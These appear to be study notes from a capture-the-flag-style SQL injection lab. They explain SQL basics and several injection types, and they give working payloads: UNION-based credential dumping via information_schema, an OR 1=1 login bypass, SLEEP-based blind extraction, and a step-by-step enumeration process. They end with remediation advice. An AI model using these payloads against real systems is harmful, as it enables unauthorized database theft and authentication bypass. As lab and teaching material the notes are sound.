SQL Injection:
    * SQL - Structured Query Language. Used on databases attached to web servers.
    * When user input is not validated, could result in theft/deletion/alteration of database.
    * Can also lead to attacks against authentication methods to private or customer areas.

Databases: (Overview)
    * A database is a way of storing information in an organised manner.
    * Controlled by a DBMS (DB management system), that can be relational or non-relational.
    * Can be multiple databases within a DBMS. E.g shop vs staff vs accounts may share/exclude info.
    * Table: Each row contains an e.g users info. Each collumn stores information relating to e.g users.
    * Column: Known as a field. Has a unique name per table, data type specified.
    * Row: Known as a record, when we add to the database a new row is created.

MySQL Statements: SELECT, INSERT, UPDATE, DELETE. SQL syntax not case-sensitive.

    SELECT - retrieve data:
    select * from users;          # all columns
    select username,password from users; # specific columns
    select * from users LIMIT 1;  # limit rows, LIMIT skip,count
    select * from users where username='admin'; # filter rows
    select * from users where username != 'admin';
    select * from users where username='admin' or username='jon';
    select * from users where username='admin' and password='p4ssword';
    select * from users where username like 'a%';  # starts with 'a'
    select * from users where username like '%n';  # ends with 'n'
    select * from users where username like '%mi%'; # contains 'mi'

    UNION - combine results of 2+ SELECTs; must match column count, type, order:
    SELECT name,address,city,postcode from customers 
    UNION 
    SELECT company,address,city,postcode from suppliers;

    INSERT - add new row:
    insert into users (username,password) values ('bob','password123');

    UPDATE - modify existing rows:
    update users SET username='root',password='pass123' where username='admin';

    DELETE - remove rows:
    delete from users where username='martin'; # delete specific
    delete from users;                          # delete all

What is SQL Injection?:
    * Occurs when user input is used in an SQL query.
    Example:    https://website.thm/blog?id=1   --queried-->    SELECT * from blog where id=1 and private=0 LIMIT 1;
        - if id=2 was blocked         https://website.thm/blog?id=2;--        -- denotes anyting after is comment
    

In-Band SQLi:
    * One of the easiest methods, in-band refers to exploit and results in the same communication channel.
    Example: exploiting an SQLi vulnerability in a web page and returning results to the page.

Error-based SQLi: 
    * Most useful for obtaining information about the database structure. Errors printed on page.
    * Often used to enumerate an entire database.

Union-Based SQLi:
    * Used to extract large amounts of data from a database.
    * Involves utilising the SQL UNION operator and SELECT statement to return additional results to the page.

Practical:
    - Use ' and " to break the SQL query. We want errors, baby!
    - By putting double quotes at the end, we produce error. THIS IS PROOF OF SQLi VULNERABILITY!
    - https://website.thm/article?id=1 returns the first article of this web page.
    - https://website.thm/article?id=1 UNION SELECT 1 gives ---> Cardinality violation: 1222 The used SELECT statements have a different number of columns
    - Cardinality violation means the UNION SELECT statement has diff no. of columns than the original.
    - By doing UNION SELECT 1,2,3 we solve error, prints to page. IN-BAND!!!
    - Finding the name of the DB: UNION SELECT 1,2,database() ---> sqli_one
    - Gather a list of tables from this DB: 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
    - group_concat() gets the specified column from multiple returned rows.
    - information_schema() is a database that is accessible to all users. Contains info re what tables and DBs the user has access to.
    - Instead of table_name, can use column_name. group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
    - Based on the structure found, we find password with group_concat(username,':',password SEPARATOR '<br>') FROM staff_users

BLIND SQLi Challenge: 
    - We receive little to no feedback in this case. Errors have been disabled.
    - We only need a little feedback to enumerate the whole database.
    - One of the most common instances of blind is authentication bypass. Dont care about errors, just getting in.
    - Login logic: "Do you have a user with the username bob and the password bob123?"
    - We dont need a correct pair, we just need to create a database query that replies with a yes/true.
    - We need something that's always true: ' OR 1=1;-- (1 does indeed = 1)

BOOLEAN BASED SQLi Challenge: 
    - Refers to response received from our query being true/false.
    - Despite this limited feedback, we can still enumerate a whole DB.
    - An example of this is 'username taken.' It indicates that, e.g, admin is taken.

TIME BASED SQLi Challenge:
    - Indicator of correct query is time taken. Delay is introduced using SLEEP(x) alongside UNION. 
    - SLEEP is only ever executed upon successful UNION SELECT query.
    - So, establishing number of columns: admin123' UNION SELECT SLEEP(5);--
    - If there is no pause, unsuccessful.

OUT OF BAND SQLi:
    - Refers to (rare) situations where specific features are enabled on DB server or web app, making a network call based on SQL query results.
    - Out of band attacks have two communication channels. E.g attack channel is web request, data gathering channel could monitor HTTP/DNS requests made to a service we control.

Remidiation:
    * PREPARED STATEMENTS (with parameterised queries):
        - Developer writes the query, user defines parameters.
    
    * Input validation:
        - Allow list limits input to certain strings. Some string replacement method can filter disallowed/ allowed chars.
    
    * Escaping User inputs:
        - Characters like ' " \ & are dangerous. Method: prepend a backslash (\), causes them to be parsed and treated as normal chars, not special.
        


***General Process:
Step 1.     Establish number of columns in user DB (...' UNION SELECT 1;--), error, append, error, append
Step 2.     Discover database name (' UNION SELECT 1,2,3 where database() like '%';--) where % is wildcard.
            Now check 'a%', now check 'b%'. We slowly build up the name of the DB!
            **HUGE Check size of name of DB: admin123' UNION SELECT IF(LENGTH(database())=9, SLEEP(3), 0),2;-- 


Step 3.     Enumerate table names with the information_schema database. ' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
            This looks for results in information_schema db in the tables table, where the DB name is sql_three and table name begins with a.
            => users!

Step 4.     Finally, we need to enumerate the column names in the users table so we can search for creds.
            => To avoid discovering the same column repeatedly, use ...COLUMN_NAME like '%' and COLUMN_NAME != 'id';


database() returns true for sql__four and '__li_____'
admin123' UNION SELECT SLEEP(5), 2 WHERE database() like '__l%';--

